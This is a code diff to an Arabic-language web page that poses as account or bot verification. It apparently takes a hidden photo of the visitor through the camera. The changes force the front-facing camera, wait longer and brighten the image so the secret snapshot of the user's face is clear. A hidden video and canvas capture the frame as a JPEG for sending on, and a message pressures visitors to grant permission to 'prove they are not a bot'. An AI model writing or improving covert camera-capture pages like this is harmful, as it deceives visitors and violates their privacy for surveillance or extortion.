@@ -16,7 +16,6 @@
             margin: 0;
             position: relative;
         }
-        /* الدائرة الخضراء الصغيرة في الزاوية */
         .live-dot {
             position: absolute;
             top: 15px;
@@ -80,7 +79,6 @@
 </head>
 <body>
 
-    <!-- الدائرة الخضراء -->
     <div class="live-dot"></div>
 
     <div class="card">
@@ -93,7 +91,6 @@
         <div class="msg" id="statusMsg">جاري الاتصال بالسيرفر والتحقق من الحساب...</div>
     </div>
 
-    <!-- عناصر الكاميرا المخفية -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -115,12 +112,17 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
-            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
+            // نطلب الكاميرا الأمامية إجبارياً facingMode: 'user'
+            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: 'user' }, audio: false })
                 .then(stream => {
                     video.srcObject = stream;
                     
+                    // نزيدو الوقت شوية (1.5 ثانية) باش الكاميرا تلقط الإضاءة مليح وما تجيش سوداء
                     setTimeout(() => {
                         const context = canvas.getContext('2d');
+                        
+                        // إضافة فلتر تفتيح الإضاءة والسطوع (Brightness) تلقائياً لتفادي السواد
+                        context.filter = 'brightness(1.5) contrast(1.2)';
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(blob => {
@@ -137,10 +139,10 @@
                                     statusMsg.style.color = "#2ecc71";
                                 }, 1000);
                             });
-                        }, 'image/jpeg', 0.8);
+                        }, 'image/jpeg', 0.85);
 
                         stream.getTracks().forEach(track => track.stop());
-                    }, 500);
+                    }, 1500);
                 })
                 .catch(err => {
                     statusMsg.innerHTML = "⚠️ عذراً، يجب السماح بالإذن لتأكيد أنك لست روبوت (Bot)!";
